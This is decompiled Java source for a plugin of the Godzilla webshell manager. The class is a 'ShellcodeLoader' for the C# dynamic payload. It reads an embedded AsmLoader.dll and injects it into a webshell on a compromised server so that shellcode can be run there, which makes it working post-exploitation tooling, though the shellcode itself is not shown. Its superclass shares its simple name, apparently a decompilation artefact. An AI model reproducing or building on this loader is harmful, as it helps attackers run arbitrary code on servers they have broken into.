/*    */ package shells.plugins.cshap;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import java.io.InputStream;
/*    */ import shells.plugins.generic.ShellcodeLoader;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "ShellcodeLoader", DisplayName = "ShellcodeLoader")
/*    */ public class ShellcodeLoader
/*    */   extends ShellcodeLoader
/*    */ {
/*    */   private static final String CLASS_NAME = "AsmLoader.Run";
/*    */   
/*    */   public boolean load() {
/* 40 */     if (!this.loadState) {
/*    */       try {
/* 42 */         InputStream inputStream = getClass().getResourceAsStream("assets/AsmLoader.dll");
/* 43 */         byte[] data = functions.readInputStream(inputStream);
/* 44 */         inputStream.close();
/* 45 */         if (this.payload.include("AsmLoader.Run", data)) {
/* 46 */           this.loadState = true;
/* 47 */           GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
/*    */         } else {
/* 49 */           GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
/*    */         } 
/* 51 */       } catch (Exception e) {
/* 52 */         Log.error(e);
/* 53 */         GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*    */       } 
/*    */     }
/*    */     
/* 57 */     return this.loadState;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getClassName() {
/* 62 */     return "AsmLoader.Run";
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\cshap\ShellcodeLoader.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */